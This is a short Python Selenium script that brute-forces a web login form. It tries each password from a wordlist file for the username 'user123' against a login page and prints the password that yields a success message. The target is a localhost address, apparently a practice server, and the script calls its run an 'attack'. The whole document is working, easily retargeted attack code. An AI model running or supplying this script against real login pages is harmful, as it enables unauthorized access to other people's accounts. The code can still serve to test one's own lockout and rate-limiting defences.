from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep

url = "http://127.0.0.1:5000/secure"
username = "user123"

# Load password list
with open("passwoerter.txt", "r") as file:
    password_list = [line.strip() for line in file]

# Start Chrome browser
driver = webdriver.Chrome()

# Load the page
driver.get(url)
sleep(0.5)

for pwd in password_list:
    print(f"Testing password: {pwd}")
    try:
        # Clear and fill input fields
        driver.find_element(By.ID, "username").clear()
        driver.find_element(By.ID, "username").send_keys(username)

        driver.find_element(By.ID, "password").clear()
        driver.find_element(By.ID, "password").send_keys(pwd)

        # Submit the form
        driver.find_element(By.XPATH, "//button[@type='submit']").click()
        sleep(0.5)

        # Check if login was successful
        message = driver.find_element(By.ID, "message").text
        print(f"Server response: {message}")
        if "successful" in message.lower():
            print(f"[+] Password found: {pwd}")
            break
        else:
            print("[-] Incorrect password")
    except Exception as e:
        print(f"[!] Error with {pwd}: {e}")
        continue

print("🟢 Attack complete. Browser window remains open for analysis.")
input("Press [Enter] to close the browser window...")

driver.quit()